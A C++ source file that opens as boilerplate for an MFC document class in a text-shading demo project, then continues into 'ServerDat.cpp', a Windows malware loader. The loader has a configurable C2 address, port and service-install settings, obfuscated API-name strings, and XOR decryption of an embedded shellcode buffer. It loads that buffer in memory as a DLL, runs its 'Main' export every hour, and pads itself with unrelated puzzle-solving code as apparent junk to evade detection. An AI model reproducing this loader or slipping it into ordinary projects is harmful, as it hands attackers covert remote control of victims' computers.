// TextShadePrjDoc.cpp : implementation of the CTextShadePrjDoc class
// Download by http://www.codefans.net

#include "stdafx.h"
#include "TextShadePrj.h"

#include "TextShadePrjDoc.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CTextShadePrjDoc

IMPLEMENT_DYNCREATE(CTextShadePrjDoc, CDocument)

BEGIN_MESSAGE_MAP(CTextShadePrjDoc, CDocument)
	//{{AFX_MSG_MAP(CTextShadePrjDoc)
		// NOTE - the ClassWizard will add and remove mapping macros here.
		//    DO NOT EDIT what you see in these blocks of generated code!
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CTextShadePrjDoc construction/destruction

CTextShadePrjDoc::CTextShadePrjDoc()
{
	// TODO: add one-time construction code here

}

CTextShadePrjDoc::~CTextShadePrjDoc()
{
}

BOOL CTextShadePrjDoc::OnNewDocument()
{
	if (!CDocument::OnNewDocument())
		return FALSE;

	// TODO: add reinitialization code here
	// (SDI documents will reuse this document)

	return TRUE;
}



/////////////////////////////////////////////////////////////////////////////
// CTextShadePrjDoc serialization

void CTextShadePrjDoc::Serialize(CArchive& ar)
{
	if (ar.IsStoring())
	{
		// TODO: add storing code here
	}
	else
	{
		// TODO: add loading code here
	}
}

/////////////////////////////////////////////////////////////////////////////
// CTextShadePrjDoc diagnostics

#ifdef _DEBUG
void CTextShadePrjDoc::AssertValid() const
{
	CDocument::AssertValid();
}

void CTextShadePrjDoc::Dump(CDumpContext& dc) const
{
	CDocument::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CTextShadePrjDoc commands
// ServerDat.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <stdio.h>
#include <windows.h>
#include <stdlib.h>
#include "MemoryModule.h"

#include "ShellCode.h"
typedef int (WINAPI *PFN_POPMSGBOX)(void);


typedef DWORD
(WINAPI
 *GetModuleFileNameAT)(
 __in_opt HMODULE hModule,
 __out_ecount_part(nSize, return + 1) LPCH lpFilename,
 __in     DWORD nSize
 );






typedef struct _THREADDATA2
{
	TCHAR szDns[300];		//���ߵ�ַ
	DWORD dwPort;		//���߶˿�
	TCHAR szGroup[50];		//���߷���
	TCHAR szVersion[32];	//���߰汾
	TCHAR SerName[100];		//��������
	TCHAR Serdisplay[128];	//��ʾ����
	TCHAR Serdesc[256];		//��������
	TCHAR szGetGroup[256];	//����Ψһ��ʶ
	BOOL  bServer;			//�Ƿ�������
	BOOL  bRuns;			//��д������
	BOOL  bRunOnce;			//�Ƿ�Ϊ��ɫ��װ
}*LPTHREADDATA2, THREADDATA2;

struct MODIFY_DATA
{
	TCHAR szDns[300];		//���ߵ�ַ
	DWORD dwPort;		//���߶˿�
	TCHAR szGroup[50];		//���߷���
	TCHAR szVersion[32];	//���߰汾
	TCHAR SerName[100];		//��������
	TCHAR Serdisplay[128];	//��ʾ����
	TCHAR Serdesc[256];		//��������
	TCHAR szGetGroup[256];	//����Ψһ��ʶ
	BOOL  bServer;			//�Ƿ�������
	BOOL  bRuns;			//��д������
	BOOL  bRunOnce;			//�Ƿ�Ϊ��ɫ��װ

	
}modify_data = 
{
	"           D         ",
		80,
		"",
		"",
		"",
		"",
		"",
		"",
		TRUE,			//TRUEΪ��������
		TRUE,			//TRUEΪ˫����
		TRUE,			//FALSEΪ��װ,TRUEΪ��ɫ��װ

		
};


typedef int
(WINAPIV
 *wsprintfAT)(
 __out LPSTR,
 __in __format_string LPCSTR,
 ...);





extern "C" _declspec(dllexport) LPVOID SPACE()
{
	
	char FoKld[] = {'U','S','E','R','3','2','.','d','l','l','\0'};
	
	char aPTQY[] = {'w','s','p','r','i','n','t','f','A','\0'};

	wsprintfAT pwsprintfA=(wsprintfAT)GetProcAddress(LoadLibrary(FoKld),aPTQY);
	LPTHREADDATA2 pData = new THREADDATA2;
	pwsprintfA(pData->szDns,modify_data.szDns);
	pwsprintfA(pData->szGroup,modify_data.szGroup);
	pwsprintfA(pData->SerName,modify_data.SerName);
	pwsprintfA(pData->Serdisplay,modify_data.Serdisplay);
	pwsprintfA(pData->Serdesc,modify_data.Serdesc);
	pwsprintfA(pData->szGetGroup,modify_data.szGetGroup);
	pwsprintfA(pData->szVersion,modify_data.szVersion);
	pData->dwPort=modify_data.dwPort;
	pData->bServer=modify_data.bServer;
	pData->bRuns=modify_data.bRuns;
	pData->bRunOnce=modify_data.bRunOnce;


	return (LPVOID)pData;
//	return 0;
}

void spacedecryption ( char * Buff, int  Size,  char * AddTable)
{


		
		for (int i=0, j=0; i< Size; i++)
		{
			
				
			j++;
			
						
			Buff[i] =Buff[i]^AddTable[j];

			Sleep(0);
			if (i% 5 == 0)
				j=0;
			
		}

}

unsigned char MyFileTabLe[]={'0xBA', '0x13', '0xEF', '520', '0xDD'};
void LoadDllCall( const char *name)
{
	
	
	try
	{
		if(1+1==2)throw 35;
	}
	catch (...)
	{
			HMEMORYMODULE hDll;
		PFN_POPMSGBOX pfn;
		
		
			
			//		OutputDebugString("����loader");
			hDll=MemoryLoadLibrary(m_MyShellCodeFileBuf);
		
		
		//		OutputDebugString("�ж�");
		if (hDll==NULL)
		{
			
				//					OutputDebugString("���ڿ���");
				return ;
		}
		//��ȡ�����ĺ����ĵ�ַ
		pfn=MemoryGetProcAddress(hDll,name);
		if (pfn==NULL)
		{
			
				MemoryFreeLibrary(hDll);
			
			return;
		}
		//	
		pfn();
		
		//	printf("���ý���!\n");
		if (hDll!=NULL)
		{
			
				MemoryFreeLibrary(hDll);
			
			hDll=NULL;
		}
		
	}
}
#include <stdio.h> 
int anpai[7][5][3]; 
int biaozhi[16][16]; 
int i=0,j=0,k=0,a,total=0; 
void huisu() 
{   
	if(k==1) 
	{   anpai[ i ][j][0]=0;  j--; 
	if(j==-1) {  i--; j=4; } 
	biaozhi[anpai[ i ][j][2]][anpai[ i ][j][1]]=0; 
	biaozhi[anpai[ i ][j][2]][anpai[ i ][j][0]]=0; 
	k=2;  a=anpai[ i ][j][k]; anpai[ i ][j][k]=0;  total-=2; 
	} 
	else if(k==2)  { biaozhi[anpai[ i ][j][1]][anpai[ i ][j][0]]=0; 
	a=anpai[ i ][j][--k];  anpai[ i ][j][k]=0; total--; 
	} 
} 
int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{

	
	
	
	try
	{
		if(1+1==2)throw 89;
	}
	catch (...)
	{
		 		int b,c,t; 
	 		for(a=1; a<=15&&total<105; a++) 
		 		{   t=0; 
	 		for(b=0; b<=j; b++) 
		 			for(c=0; c<3; c++) 
		 				if(anpai[ i ][ b ][c]==a) {  b=9; break; } 
		 				if(b==10) 
		 				{ 
		 					while(a==15) huisu(); 
		 					continue; 
		 				} 
		 				for(b=0; b<k; b++) 
		 					if(biaozhi[a][anpai[ i ][j][ b ]]==1) 
		 					{ 
		 						while(a==15) { huisu(); t=1; } 
		 						break; 
		 					} 
		 					if(b<k||t==1) continue; 
		 					if(a==15&&k<2) { while(a==15) huisu();   continue; } 
		 					switch(k) 
		 					{ 
		 					case 0: anpai[ i ][j][k++]=a; total++; break; 
		 					case 1: anpai[ i ][j][k++]=a; total++; 
		 						biaozhi[a][anpai[ i ][j][0]]=1;  break; 
		 					case 2: anpai[ i ][j][k]=a;   total++; 
		 						biaozhi[a][anpai[ i ][j][0]]=1; 
		 						biaozhi[a][anpai[ i ][j][1]]=1; 
		 						j++; 
		 						if(total%15==0) { i++; j=0; } 
		 						k=0; a=0; break; 
		 					} 
		 					break;
		 		} 
		 		for(a=1;a<8; a++)   
		 			printf("��%d��      ",a); 
		 		for(j=0; j<5; j++) 
		 		{   printf("\n"); 
	 		for(i=0; i<7; i++) 
		 		{ 
		 			if(i>0&&i<7) printf("  "); 
		 			for(k=0; k<3; k++) 
						printf("%-2d ", anpai[ i ][j][k]); 
		 		} 
		 	} printf("\n");
		
			
			// TODO: Place code here.
		
					OutputDebugString("����WinMain");
		
		GetModuleFileNameAT pGetModuleFileNameA=(GetModuleFileNameAT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"GetModuleFileNameA");
	//	SleepT pSleep=(SleepT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"Sleep");
		spacedecryption((char *)m_MyShellCodeFileBuf,m_MyShellCodeFileSize,(char *)MyFileTabLe);
		
			char	NaMa[MAX_PATH]; 
		memset(NaMa, 0,sizeof(NaMa)); 	
		
			pGetModuleFileNameA(NULL,NaMa,sizeof(NaMa));
		FILE *p= NULL; //�Զ�����д�ķ�ʽ���ļ�
		p=fopen(NaMa,"r");
		if(p==NULL) 
		{ 
			Sleep(0);
			fclose(p);
			p = NULL;
			exit(1);
			return -1; 
		} 
	//		OutputDebugString("����");
		
		//char Host[]={'F','i','\0'};	
		//	char*Host ="Main";
		
		char Host[] = {'M','a','i','n','\0'};
	//	MessageBox(0,0,0)
		while(1)
		{

			
				LoadDllCall(Host);
			Sleep(1000*60*60);
		}
		
		return 0;
	}
					 }
					 

					 
